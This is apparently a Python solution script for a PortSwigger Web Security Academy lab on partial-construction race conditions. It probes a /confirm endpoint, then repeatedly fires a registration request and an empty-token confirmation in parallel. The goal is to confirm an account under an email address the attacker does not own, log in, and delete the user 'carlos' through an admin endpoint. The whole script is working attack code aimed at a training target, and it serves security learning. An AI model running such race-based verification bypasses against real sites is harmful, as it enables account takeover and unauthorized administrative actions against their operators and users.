# Lab 06 — Partial construction race conditions
# PortSwigger: https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction
#
# Vulnerability: User registration requires email confirmation via a
#                token, and an EMPTY token parameter is correctly
#                rejected ("Forbidden") in the FULLY CONSTRUCTED state —
#                but there may be a brief PARTIAL-CONSTRUCTION window
#                during account creation where this check isn't yet
#                fully enforced
# Aim:           Register an account using an email address you don't
#                own by racing the confirmation request against the
#                registration request, then log in and delete carlos
#
# Technique:
#   Submit registration (POST /register) AND an empty-token confirmation
#   request (POST /confirm?token=) in the SAME parallel burst, repeated
#   across many attempts. If the confirmation request lands DURING the
#   partial-construction window (before the "reject empty tokens" check
#   is fully active for this specific new account), it may succeed.
#
#   ⚠  This is the hardest lab in the module — PortSwigger's own
#      description warns you may need to experiment with different
#      timing/ordering. This script automates the repeated-attempt
#      structure but genuinely may need many rounds, or Burp's finer-
#      grained single-packet/Turbo Intruder tooling, to land a hit.
#
# Usage: python race_conditions_lab06.py <url> <trusted_domain> [attempts]

import sys
import urllib3
from proxies import proxies
from race_conditions_utils import (banner, section, make_session, login,
                                    get_csrf_from_response, send_parallel,
                                    warm_connection, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def probe_confirm_behavior(session, url):
    """
    Confirm the three distinct /confirm response behaviors described in
    the module notes, to verify we understand this lab instance's exact
    mechanism before attempting the race.
    """
    r_arbitrary = session.post(f"{url}/confirm", data={"token": "arbitraryvalue123"})
    r_missing = session.post(f"{url}/confirm", data={})
    r_empty = session.post(f"{url}/confirm", data={"token": ""})

    print(f"  ℹ  token=arbitrary → [{r_arbitrary.status_code}] {r_arbitrary.text[:80]}")
    print(f"  ℹ  no token param  → [{r_missing.status_code}] {r_missing.text[:80]}")
    print(f"  ℹ  token= (empty)  → [{r_empty.status_code}] {r_empty.text[:80]}")


if __name__ == "__main__":
    banner()
    section("LAB 06 — PARTIAL CONSTRUCTION RACE CONDITIONS")

    if len(sys.argv) < 3:
        print("  Usage: python race_conditions_lab06.py <url> <trusted_domain> [attempts]")
        print("  Example: python race_conditions_lab06.py https://target.net ginandjuice.shop")
        sys.exit(1)

    url = sys.argv[1]
    trusted_domain = sys.argv[2]
    attempts = int(sys.argv[3]) if len(sys.argv) > 3 else 30

    session = make_session(proxies)

    # ── Step 1: confirm the three-behavior pattern for this lab instance ────
    print("\n  ── Step 1: probe /confirm's baseline behavior\n")
    probe_confirm_behavior(session, url)
    print()
    print("  ℹ  Expect: arbitrary token → 'Incorrect token'")
    print("             missing param   → 'Missing parameter'")
    print("             empty token     → 'Forbidden' (patched — but maybe")
    print("             only AFTER full account construction completes)\n")

    target_email = f"attacker@{trusted_domain}"
    warm_connection(session, url)

    # ── Step 2: repeatedly race registration against an empty-token confirm ─
    print(f"  ── Step 2: race registration against empty-token confirmation")
    print(f"             up to {attempts} attempts\n")
    print("  ⚠  This is the hardest lab in the module. Expect to need many")
    print("     attempts, and possibly Burp's Turbo Intruder for finer control")
    print("     over the exact race window than pure Python can offer.\n")

    succeeded = False

    for attempt in range(1, attempts + 1):
        reg_session = make_session(proxies)
        confirm_session = make_session(proxies)

        # Use a fresh username each attempt to avoid "already exists" errors
        username = f"attacker{attempt}"

        def register_request():
            reg_page = reg_session.get(f"{url}/register")
            csrf = get_csrf_from_response(reg_page.text)
            data = {
                "username": username,
                "password": "Password123!",
                "email": target_email,
            }
            if csrf:
                data["csrf"] = csrf
            return reg_session.post(f"{url}/register", data=data)

        def confirm_empty_request():
            return confirm_session.post(f"{url}/confirm", data={"token": ""})

        reg_result, confirm_result = send_parallel([register_request, confirm_empty_request])

        confirm_status = (
            confirm_result.status_code
            if confirm_result and not isinstance(confirm_result, Exception)
            else None
        )
        confirm_body = (
            confirm_result.text[:100]
            if confirm_result and not isinstance(confirm_result, Exception)
            else ""
        )

        # A successful bypass would NOT return "Forbidden" for the empty token
        if confirm_status and confirm_status != 403 and "forbidden" not in confirm_body.lower():
            print(f"  ✔  Attempt {attempt}: unexpected confirm response!")
            print(f"     Status: {confirm_status}, body: {confirm_body}")

            # Try logging in with this username to see if registration completed
            test_session = make_session(proxies)
            if login(test_session, url, username=username, password="Password123!"):
                print(f"  ✔  Login succeeded for {username} — partial construction bypass worked!")
                succeeded = True
                session = test_session
                break

        if attempt % 5 == 0:
            print(f"  ·  attempt {attempt}/{attempts} — no bypass yet")

    if not succeeded:
        print(f"\n  ✘  No successful bypass within {attempts} attempts.")
        print("     This is expected — this lab is explicitly the hardest in")
        print("     the module. Recommended next steps:")
        print("     1. Increase attempts significantly (100+)")
        print("     2. Use Burp's 'Send group in parallel (single-packet")
        print("        attack)' for tighter synchronisation than Python threading")
        print("     3. Consider using Turbo Intruder with its gate mechanism")
        print("        and experimenting with SLIGHT relative delays between")
        print("        the two requests rather than perfectly simultaneous —")
        print("        the partial-construction window may not start at t=0")
        sys.exit(1)

    # ── Step 3: delete carlos ──────────────────────────────────────────────────
    print("\n  ── Step 3: delete carlos\n")
    r_delete = session.post(f"{url}/admin/delete", data={"username": "carlos"})
    check_status(r_delete, [200, 302], "Delete carlos")

    print()
    print("  ℹ  The vulnerability lived in a brief INTERNAL sub-state during")
    print("     account creation — invisible from outside, and only reachable")
    print("     by racing a request against the exact moment that state exists.")
